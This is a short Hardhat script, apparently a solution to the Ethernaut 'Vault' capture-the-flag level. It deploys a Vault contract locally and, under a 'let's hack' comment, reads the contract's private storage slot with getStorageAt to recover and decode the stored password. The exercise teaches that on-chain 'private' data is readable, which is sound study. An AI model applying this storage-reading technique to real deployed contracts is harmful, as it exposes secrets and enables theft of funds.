const { network, deployments, ethers, getNamedAccounts } = require("hardhat");
const {
  numToBytes32,
  parseBytes32String,
} = require("@chainlink/test-helpers/dist/src/helpers");

async function main() {
  const [owner, addr1, addr2] = await ethers.getSigners();

  const Vault = await ethers.getContractFactory("Vault");
  const vault = await Vault.deploy(
    "0x00000000000000000000000000000000000000000000000000000000007b7b7b"
  );
  await vault.deployed();

  const hacker = await vault.connect(addr1);

  // ------------ let's hack -------------

  const pwd = await owner.provider.getStorageAt(vault.address, 1);
  console.log(`password = ${pwd} "${Buffer.from(pwd.slice(2), `hex`)}"`);
}

// hh run scripts/ethernaut1.js --network hardhat
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
